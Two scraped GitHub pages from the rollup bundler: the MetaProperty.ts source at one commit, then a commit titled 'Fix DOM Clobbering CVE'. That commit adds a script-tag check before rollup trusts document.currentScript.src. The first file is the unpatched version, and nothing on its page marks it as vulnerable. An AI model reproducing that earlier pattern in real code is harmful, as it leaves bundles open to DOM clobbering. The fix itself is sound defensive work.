=== Content from github.com_11eba8d8_20250110_151154.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fblob%2Fb86ffd776cfa906573d36c3f019316d02445d9ef%2Fsrc%2Fast%2Fnodes%2FMetaProperty.ts)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fblob%2Fb86ffd776cfa906573d36c3f019316d02445d9ef%2Fsrc%2Fast%2Fnodes%2FMetaProperty.ts)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rollup%2Frollup)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rollup](/rollup)
/
**[rollup](/rollup/rollup)**
Public

* [Notifications](/login?return_to=%2Frollup%2Frollup) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Frollup%2Frollup)
* [Star
   25.5k](/login?return_to=%2Frollup%2Frollup)

* [Code](/rollup/rollup)
* [Issues
  558](/rollup/rollup/issues)
* [Pull requests
  25](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects
  0](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

Additional navigation options

* [Code](/rollup/rollup)
* [Issues](/rollup/rollup/issues)
* [Pull requests](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

## Files

 b86ffd7
## Breadcrumbs

1. [rollup](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef)
2. /[src](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src)
3. /[ast](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast)
4. /[nodes](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes)
/
# MetaProperty.ts

 Blame  Blame
## Latest commit

## History

[History](/rollup/rollup/commits/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts)225 lines (201 loc) · 7.54 KB b86ffd7
## Breadcrumbs

1. [rollup](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef)
2. /[src](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src)
3. /[ast](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast)
4. /[nodes](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes)
/
# MetaProperty.ts

Top
## File metadata and controls

* Code
* Blame

225 lines (201 loc) · 7.54 KB[Raw](https://github.com/rollup/rollup/raw/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225import type MagicString from 'magic-string';import type { InternalModuleFormat } from '../../rollup/types';import type { PluginDriver } from '../../utils/PluginDriver';import { escapeId } from '../../utils/escapeId';import type { GenerateCodeSnippets } from '../../utils/generateCodeSnippets';import { DOCUMENT\_CURRENT\_SCRIPT } from '../../utils/interopHelpers';import { dirname, normalize, relative } from '../../utils/path';import type { RenderOptions } from '../../utils/renderHelpers';import type { NodeInteraction } from '../NodeInteractions';import { INTERACTION\_ACCESSED } from '../NodeInteractions';import type ChildScope from '../scopes/ChildScope';import type { ObjectPath } from '../utils/PathTracker';import type Identifier from './Identifier';import MemberExpression from './MemberExpression';import type \* as NodeType from './NodeType';import { NodeBase } from './shared/Node';
const FILE\_PREFIX = 'ROLLUP\_FILE\_URL\_';const IMPORT = 'import';
export default class MetaProperty extends NodeBase { declare meta: Identifier; declare property: Identifier; declare type: NodeType.tMetaProperty;
 private metaProperty: string | null = null; private preliminaryChunkId: string | null = null; private referenceId: string | null = null;
 getReferencedFileName(outputPluginDriver: PluginDriver): string | null { const { meta: { name }, metaProperty } = this; if (name === IMPORT && metaProperty?.startsWith(FILE\_PREFIX)) { return outputPluginDriver.getFileName(metaProperty.slice(FILE\_PREFIX.length)); } return null; }
 hasEffects(): boolean { return false; }
 hasEffectsOnInteractionAtPath(path: ObjectPath, { type }: NodeInteraction): boolean { return path.length > 1 || type !== INTERACTION\_ACCESSED; }
 include(): void { if (!this.included) { this.included = true; if (this.meta.name === IMPORT) { this.scope.context.addImportMeta(this); const parent = this.parent; const metaProperty = (this.metaProperty = parent instanceof MemberExpression && typeof parent.propertyKey === 'string' ? parent.propertyKey : null); if (metaProperty?.startsWith(FILE\_PREFIX)) { this.referenceId = metaProperty.slice(FILE\_PREFIX.length); } } } }
 render(code: MagicString, renderOptions: RenderOptions): void { const { format, pluginDriver, snippets } = renderOptions; const { scope: { context: { module } }, meta: { name }, metaProperty, parent, preliminaryChunkId, referenceId, start, end } = this; const { id: moduleId } = module;
 if (name !== IMPORT) return; const chunkId = preliminaryChunkId!;
 if (referenceId) { const fileName = pluginDriver.getFileName(referenceId); const relativePath = normalize(relative(dirname(chunkId), fileName)); const replacement = pluginDriver.hookFirstSync('resolveFileUrl', [ { chunkId, fileName, format, moduleId, referenceId, relativePath } ]) || relativeUrlMechanisms[format](relativePath);
 code.overwrite( (parent as MemberExpression).start, (parent as MemberExpression).end, replacement, { contentOnly: true } ); return; }
 let replacement = pluginDriver.hookFirstSync('resolveImportMeta', [ metaProperty, { chunkId, format, moduleId } ]); if (!replacement) { replacement = importMetaMechanisms[format]?.(metaProperty, { chunkId, snippets }); renderOptions.accessedDocumentCurrentScript ||= formatsMaybeAccessDocumentCurrentScript.includes(format) && replacement !== 'undefined'; } if (typeof replacement === 'string') { if (parent instanceof MemberExpression) { code.overwrite(parent.start, parent.end, replacement, { contentOnly: true }); } else { code.overwrite(start, end, replacement, { contentOnly: true }); } } }
 setResolution( format: InternalModuleFormat, accessedGlobalsByScope: Map<ChildScope, Set<string>>, preliminaryChunkId: string ): void { this.preliminaryChunkId = preliminaryChunkId; const accessedGlobals = ( this.metaProperty?.startsWith(FILE\_PREFIX) ? accessedFileUrlGlobals : accessedMetaUrlGlobals )[format]; if (accessedGlobals.length > 0) { this.scope.addAccessedGlobals(accessedGlobals, accessedGlobalsByScope); } }}
export const formatsMaybeAccessDocumentCurrentScript = ['cjs', 'iife', 'umd'];
const accessedMetaUrlGlobals = { amd: ['document', 'module', 'URL'], cjs: ['document', 'require', 'URL', DOCUMENT\_CURRENT\_SCRIPT], es: [], iife: ['document', 'URL', DOCUMENT\_CURRENT\_SCRIPT], system: ['module'], umd: ['document', 'require', 'URL', DOCUMENT\_CURRENT\_SCRIPT]};
const accessedFileUrlGlobals = { amd: ['document', 'require', 'URL'], cjs: ['document', 'require', 'URL'], es: [], iife: ['document', 'URL'], system: ['module', 'URL'], umd: ['document', 'require', 'URL']};
const getResolveUrl = (path: string, URL = 'URL') => `new ${URL}(${path}).href`;
const getRelativeUrlFromDocument = (relativePath: string, umd = false) => getResolveUrl( `'${escapeId(relativePath)}', ${ umd ? `typeof document === 'undefined' ? location.href : ` : '' }document.currentScript && document.currentScript.src || document.baseURI` );
const getGenericImportMetaMechanism = (getUrl: (chunkId: string) => string) => (property: string | null, { chunkId }: { chunkId: string }) => { const urlMechanism = getUrl(chunkId); return property === null ? `({ url: ${urlMechanism} })` : property === 'url' ? urlMechanism : 'undefined'; };
const getFileUrlFromFullPath = (path: string) => `require('u' + 'rl').pathToFileURL(${path}).href`;
const getFileUrlFromRelativePath = (path: string) => getFileUrlFromFullPath(`\_\_dirname + '/${escapeId(path)}'`);
const getUrlFromDocument = (chunkId: string, umd = false) => `${ umd ? `typeof document === 'undefined' ? location.href : ` : '' }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( chunkId )}', document.baseURI).href)`;
const relativeUrlMechanisms: Record<InternalModuleFormat, (relativePath: string) => string> = { amd: relativePath => { if (relativePath[0] !== '.') relativePath = './' + relativePath; return getResolveUrl(`require.toUrl('${escapeId(relativePath)}'), document.baseURI`); }, cjs: relativePath => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath( relativePath )} : ${getRelativeUrlFromDocument(relativePath)})`, es: relativePath => getResolveUrl(`'${escapeId(relativePath)}', import.meta.url`), iife: relativePath => getRelativeUrlFromDocument(relativePath), system: relativePath => getResolveUrl(`'${escapeId(relativePath)}', module.meta.url`), umd: relativePath => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath( relativePath )} : ${getRelativeUrlFromDocument(relativePath, true)})`};
const importMetaMechanisms: Record< string, (property: string | null, options: { chunkId: string; snippets: GenerateCodeSnippets }) => string> = { amd: getGenericImportMetaMechanism(() => getResolveUrl(`module.uri, document.baseURI`)), cjs: getGenericImportMetaMechanism( chunkId => `(typeof document === 'undefined' ? ${getFileUrlFromFullPath( '\_\_filename' )} : ${getUrlFromDocument(chunkId)})` ), iife: getGenericImportMetaMechanism(chunkId => getUrlFromDocument(chunkId)), system: (property, { snippets: { getPropertyAccess } }) => property === null ? `module.meta` : `module.meta${getPropertyAccess(property)}`, umd: getGenericImportMetaMechanism( chunkId => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromFullPath( '\_\_filename' )} : ${getUrlFromDocument(chunkId, true)})` )};

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_63fcb62f_20250110_151158.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2Fe2552c9e955e0a61f70f508200ee9f752f85a541)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2Fe2552c9e955e0a61f70f508200ee9f752f85a541)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=rollup%2Frollup)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rollup](/rollup)
/
**[rollup](/rollup/rollup)**
Public

* [Notifications](/login?return_to=%2Frollup%2Frollup) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Frollup%2Frollup)
* [Star
   25.5k](/login?return_to=%2Frollup%2Frollup)

* [Code](/rollup/rollup)
* [Issues
  558](/rollup/rollup/issues)
* [Pull requests
  25](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects
  0](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

Additional navigation options

* [Code](/rollup/rollup)
* [Issues](/rollup/rollup/issues)
* [Pull requests](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

## Commit

[Permalink](/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix DOM Clobbering CVE ([#5671](https://github.com/rollup/rollup/pull/5671))

[Browse files](/rollup/rollup/tree/e2552c9e955e0a61f70f508200ee9f752f85a541)
Browse the repository at this point in the history

* Loading branch information

[![@lukastaegert](https://avatars.githubusercontent.com/u/12949268?s=40&v=4)](/lukastaegert)

[lukastaegert](/rollup/rollup/commits?author=lukastaegert "View all commits by lukastaegert")
authored
Sep 21, 2024

1 parent
[10ab90e](/rollup/rollup/commit/10ab90ea612f80de21c6c433c2d792eaf7b45f1c)

commit e2552c9

 Show file tree

 Hide file tree

Showing
**40 changed files**
with
**93 additions**
and
**91 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/ast/nodes

  + src/ast/nodes/MetaProperty.ts
    [MetaProperty.ts](#diff-ead526444ffa2c8ec92192d0d869c8405cc011b7e098048c17a01d718e789a6e)
* test

  + chunking-form/samples

    - asset-needs-code-reference/\_expected/cjs

      * test/chunking-form/samples/asset-needs-code-reference/\_expected/cjs/main.js
        [main.js](#diff-3cc5f5a8b48302716a9341ddb583faa7b10bd17955ccbe5f6cba6caef2742c6e)
    - emit-file

      * emit-chunk-with-importer/\_expected/cjs

        + test/chunking-form/samples/emit-file/emit-chunk-with-importer/\_expected/cjs/main.js
          [main.js](#diff-fb51b0329ea05ac075795f4208c82cf9b1bb94051e2ccd49d087537d53b462f0)
      * emit-chunk-worker/\_expected/cjs

        + chunks

          - test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/nested.js
            [nested.js](#diff-61f3b09538a59aa0c1a0f31e57bf719045962f99176b5c02f9e573278a18beec)
          - test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/worker-proxy.js
            [worker-proxy.js](#diff-96f4a25268a3b95f9c7df910cd93e105b23f8ee88bfa46adf94b2419e9bc0fc5)
        + test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/main.js
          [main.js](#diff-d126a8d46fea2c6147c4ec0db8d82fb9429882e6795b9c09daccc4e193934685)
      * emit-chunk-worklet/\_expected/cjs

        + test/chunking-form/samples/emit-file/emit-chunk-worklet/\_expected/cjs/main.js
          [main.js](#diff-f80d58d0fd5f68eab5e1d9a528db706c7bf036647087bb7e1f5966c840210f55)
      * reference-files/\_expected/cjs

        + test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/main.js
          [main.js](#diff-016a8c84f1219e6a16e82575e0d47cfcbb796caae8d6247831bc7964e286f8ba)
        + nested

          - test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/nested/chunk.js
            [chunk.js](#diff-826917577ab8d66ed860b11ecb1a6d0ad98b31a12a8e2de1eb8a94fd593e3e28)
      * set-asset-source/\_expected/cjs

        + test/chunking-form/samples/emit-file/set-asset-source/\_expected/cjs/main.js
          [main.js](#diff-b7be29ac86c993f2bc6070667f74fcf7c02133d55e5b22c752d9c9da0d87243d)
    - import-meta-numeric-paths/\_expected/cjs/0/1

      * test/chunking-form/samples/import-meta-numeric-paths/\_expected/cjs/0/1/nested.js
        [nested.js](#diff-530baddf14ec34e0f25ccd31994e16882458811a631bafd1a232e70f6220d304)
    - import-meta-url/\_expected/cjs

      * test/chunking-form/samples/import-meta-url/\_expected/cjs/main.js
        [main.js](#diff-156cb4dfce91ed62349135cf8cf61c8e471c5e841ef959eeb7b728e316bcb328)
      * nested

        + test/chunking-form/samples/import-meta-url/\_expected/cjs/nested/chunk.js
          [chunk.js](#diff-0fddcdeb8046d35369fd7e540d029cb7929e8052f281b927a1082221374a2464)
    - render-chunk/\_expected/cjs

      * test/chunking-form/samples/render-chunk/\_expected/cjs/chunk-dep2-Cr\_zOuBy.js
        [chunk-dep2-Cr\_zOuBy.js](#diff-9c42bc174e8fa8a7a9fbc006966b832096422c088cd71cf9e0f270b845b1fec7)
      * test/chunking-form/samples/render-chunk/\_expected/cjs/entry-main1-CW\_cw0go.js
        [entry-main1-CW\_cw0go.js](#diff-379b90c46fc99bd36b0cfe2bf29023e97040b8588736f9b720b97957b1ee32fd)
      * test/chunking-form/samples/render-chunk/\_expected/cjs/entry-main2-CvqsXhWd.js
        [entry-main2-CvqsXhWd.js](#diff-a46c58c182b7c7cc2d43d2bc19a39e857d2264ef5dc28acd0e80586751aabc75)
    - resolve-file-url/\_expected/cjs

      * test/chunking-form/samples/resolve-file-url/\_expected/cjs/main.js
        [main.js](#diff-5dfcc9ce0f4f4b15b467fb57889a820be6a3b0f1603192611b4e55b4b08d45c3)
  + form/samples

    - configure-file-url/\_expected

      * test/form/samples/configure-file-url/\_expected/cjs.js
        [cjs.js](#diff-6310a9f03aa177327fa4ac34ac7bf4c8583fdf0fbe915b331e73fd20640cd0cf)
      * test/form/samples/configure-file-url/\_expected/iife.js
        [iife.js](#diff-0ad908f884b62d0e43c75d4cd33595bec29a73624fcdddcd59e54857262cbb0b)
      * test/form/samples/configure-file-url/\_expected/umd.js
        [umd.js](#diff-5164ceb2b5fb1bfdaccf3cfb21c0a7388f375e962b445c56bd6037b1c41b92ee)
    - deconflict-format-specific-globals/\_expected

      * test/form/samples/deconflict-format-specific-globals/\_expected/cjs.js
        [cjs.js](#diff-547cde11332116e0e639352a13c38c3dcf0265361e0ff3326ce6db865bcb484b)
      * test/form/samples/deconflict-format-specific-globals/\_expected/iife.js
        [iife.js](#diff-df4008372f5a3cf2438c85443fa10f9bfa4234f9bd2d54ff218681e7a14d74e6)
      * test/form/samples/deconflict-format-specific-globals/\_expected/umd.js
        [umd.js](#diff-4e2e55c5a59cc32961af661478f396e9f1b0aed6c547e6ca38dbcc4b5aa66baf)
    - emit-asset-file/\_expected

      * test/form/samples/emit-asset-file/\_expected/cjs.js
        [cjs.js](#diff-b5e7f6d052f0fec8f3e4aca7656026ada27b695d109bb1512b895545de23931e)
      * test/form/samples/emit-asset-file/\_expected/iife.js
        [iife.js](#diff-c4c9a44949f6358f63c8bb2e6ef409e1aebdbe5ab60570eab77a9a7cd6c78748)
      * test/form/samples/emit-asset-file/\_expected/umd.js
        [umd.js](#diff-27eaf1aa6188accc40a83e3cef5158af21340cd49281ae24a32a4309b994d886)
    - emit-uint8array-no-buffer/\_expected

      * test/form/samples/emit-uint8array-no-buffer/\_expected/cjs.js
        [cjs.js](#diff-ede41810325317eec86b5cc2d247d842073b8123a1bb36eb9540409c2cdf49b4)
      * test/form/samples/emit-uint8array-no-buffer/\_expected/iife.js
        [iife.js](#diff-d70090a63f058e765b66d3890832fe1ba8cc132b299d0adeea29512822e69b46)
      * test/form/samples/emit-uint8array-no-buffer/\_expected/umd.js
        [umd.js](#diff-993bfde6ae70d42d1a02884f8f30817b908f59c4f27e0d23cd26de825fb14447)
    - import-meta-url/\_expected

      * test/form/samples/import-meta-url/\_expected/cjs.js
        [cjs.js](#diff-c93fab6e98a34c1512fff5b043bcb711f129a79cee3b07e8486bf3d2026a0d92)
      * test/form/samples/import-meta-url/\_expected/iife.js
        [iife.js](#diff-65722237e02921be1eab29042301559260b24d767f884b109bfbbbc74ccc6cde)
      * test/form/samples/import-meta-url/\_expected/umd.js
        [umd.js](#diff-d8b31362903eee1eb765ec23e49eebe00dcbc99cea3b9f11967f16063db0bf7a)
    - import-meta/\_expected

      * test/form/samples/import-meta/\_expected/cjs.js
        [cjs.js](#diff-f89917092127b39cf615f44cbd0909581b1fb2a112623a44adb66064b3e88c12)
      * test/form/samples/import-meta/\_expected/iife.js
        [iife.js](#diff-8d4af18cc4996e681a1a4a117fa924ae35bdff7c40fcd07b79889be71bf1b445)
      * test/form/samples/import-meta/\_expected/umd.js
        [umd.js](#diff-5bbfc62d51c906bfff6d8909c503769e5837c9d5db2346a5c7941f241ff659bd)
    - resolve-import-meta-url/\_expected

      * test/form/samples/resolve-import-meta-url/\_expected/cjs.js
        [cjs.js](#diff-59b4800525823c4ca033a634cedec97f140af13d3ab6547a39e8d0bca5d9ea5b)
      * test/form/samples/resolve-import-meta-url/\_expected/iife.js
        [iife.js](#diff-a18610825fc57c2251da7fe148769446e94a8633cc58c47030be2d1b18978b35)
      * test/form/samples/resolve-import-meta-url/\_expected/umd.js
        [umd.js](#diff-131428909e24ee36644f1a488a237dec31355a8efe4d784844f7a42f8dadc910)
  + function/samples

    - import-meta-url-b

      * test/function/samples/import-meta-url-b/\_config.js
        [\_config.js](#diff-b73ccac5b991681c061f2f838b50ee5c26de2af94fa21af8e7d90300b4b66641)
    - import-meta-url-with-compact

      * test/function/samples/import-meta-url-with-compact/\_config.js
        [\_config.js](#diff-738a0c49b3fda38848897c6b2827a154cf6b0dc28830a05d5bfb65f977efa84e)

## There are no files selected for viewing

6 changes: 3 additions & 3 deletions

6
[src/ast/nodes/MetaProperty.ts](#diff-ead526444ffa2c8ec92192d0d869c8405cc011b7e098048c17a01d718e789a6e "src/ast/nodes/MetaProperty.ts")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/src/ast/nodes/MetaProperty.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,10 +1,10 @@ |
|  |  | import type MagicString from 'magic-string'; |
|  |  | import type { InternalModuleFormat } from '../../rollup/types'; |
|  |  | import type { PluginDriver } from '../../utils/PluginDriver'; |
|  |  | import { escapeId } from '../../utils/escapeId'; |
|  |  | import type { GenerateCodeSnippets } from '../../utils/generateCodeSnippets'; |
|  |  | import { DOCUMENT\_CURRENT\_SCRIPT } from '../../utils/interopHelpers'; |
|  |  | import { dirname, normalize, relative } from '../../utils/path'; |
|  |  | import type { PluginDriver } from '../../utils/PluginDriver'; |
|  |  | import type { RenderOptions } from '../../utils/renderHelpers'; |
|  |  | import type { NodeInteraction } from '../NodeInteractions'; |
|  |  | import { INTERACTION\_ACCESSED } from '../NodeInteractions'; |
| Expand Down  Expand Up | | @@ -158,7 +158,7 @@ const getRelativeUrlFromDocument = (relativePath: string, umd = false) => |
|  |  | getResolveUrl( |
|  |  | `'${escapeId(relativePath)}', ${ |
|  |  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  |  | }document.currentScript && document.currentScript.src || document.baseURI` |
|  |  | }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI` |
|  |  | ); |
|  |  |  |
|  |  | const getGenericImportMetaMechanism = |
| Expand All | | @@ -180,7 +180,7 @@ const getFileUrlFromRelativePath = (path: string) => |
|  |  | const getUrlFromDocument = (chunkId: string, umd = false) => |
|  |  | `${ |
|  |  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  |  | }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( |
|  |  | }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( |
|  |  | chunkId |
|  |  | )}', document.baseURI).href)`; |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/asset-needs-code-reference/\_expected/cjs/main.js](#diff-3cc5f5a8b48302716a9341ddb583faa7b10bd17955ccbe5f6cba6caef2742c6e "test/chunking-form/samples/asset-needs-code-reference/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/asset-needs-code-reference/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
